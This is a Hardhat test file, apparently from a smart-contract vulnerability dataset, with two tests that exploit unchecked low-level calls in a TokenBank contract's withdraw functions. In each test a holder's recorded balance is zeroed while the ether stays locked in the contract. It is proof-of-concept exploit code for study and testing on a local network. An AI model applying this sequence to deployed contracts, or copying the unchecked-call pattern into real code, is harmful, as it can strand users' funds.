const { loadFixture } = require('@nomicfoundation/hardhat-network-helpers');
const { expect } = require('chai');

describe("attack unchecked_low_level_calls/0x8fd1e427396ddb511533cf9abdbebd0a7e08da35.sol", function () {
  let owner, sig;
  async function deployContracts() {
    [owner, sig] = await ethers.getSigners();
    const TokenBank = await ethers.getContractFactory("contracts/dataset/unchecked_low_level_calls/0x8fd1e427396ddb511533cf9abdbebd0a7e08da35.sol:TokenBank");
    const contract = await TokenBank.connect(owner).deploy();

    const RevertContract = await ethers.getContractFactory("contracts/unchecked_low_level_calls/revert_contract.sol:RevertContract");
    const revertContract = await RevertContract.deploy();

    return {contract, revertContract}
  };

  it("exploit unchecked low level call vulnerability in WithdrawToken()", async function () {
    const {contract, revertContract} = await loadFixture(deployContracts);

    await contract.connect(owner).initTokenBank();

    const minDeposit = await contract.MinDeposit();
    const oneEther = ethers.parseEther("1");
    expect(minDeposit).to.equal(oneEther);

    await expect(
      sig.sendTransaction({
        to: revertContract.target,
        value: oneEther,
      })
    ).to.be.revertedWith("I always revert!");

    const amount = ethers.parseEther("2");
    // Signer deposits ether to become a holder
    await sig.sendTransaction({
        to: contract.target,
        value: amount,
    });

    expect(await ethers.provider.getBalance(contract.target)).to.equal(amount);

    // Expect signer to be in Holders
    expect(await contract.Holders(sig.address)).to.equal(amount);

    // signer puts the wrong address in the withdraw function
    await contract.WitdrawTokenToHolder(sig.address, revertContract.target, amount);

    //signer no longer holds tokens
    expect(await contract.Holders(sig.address)).to.equal(0);

    const revertBalance = await ethers.provider.getBalance(revertContract.target);
    // the wrong contract doesn't get the ether
    expect(revertBalance).to.equal(0);

    // the contract still holds the ether
    expect(await ethers.provider.getBalance(contract.target)).to.equal(amount);


  });

  it("exploit unchecked low level call vulnerability in WithdrawToHolder()", async function () {
    const {contract, revertContract} = await loadFixture(deployContracts);

    await contract.connect(owner).initTokenBank();

    const minDeposit = await contract.MinDeposit();
    const oneEther = ethers.parseEther("1");
    expect(minDeposit).to.equal(oneEther);

    await expect(
      sig.sendTransaction({
        to: revertContract.target,
        value: oneEther,
      })
    ).to.be.revertedWith("I always revert!");

    const amount = ethers.parseEther("2");

    await revertContract.connect(sig).sendEther(contract.target, {value: amount});

    await owner.sendTransaction({
        to: contract.target,
        value: amount,
    });

    expect(await ethers.provider.getBalance(contract.target)).to.equal(amount + amount);

    expect(await contract.Holders(revertContract.target)).to.equal(amount);

    expect(await contract.Holders(owner.address)).to.equal(amount);

    await contract.connect(owner).WithdrawToHolder(revertContract.target, amount);

    expect(await contract.Holders(owner.address)).to.equal(amount);
    expect(await contract.Holders(revertContract.target)).to.equal(0);


    const revertBalance = await ethers.provider.getBalance(revertContract.target);
    expect(revertBalance).to.equal(0);

    expect(await ethers.provider.getBalance(contract.target)).to.equal(amount + amount);

  });


});
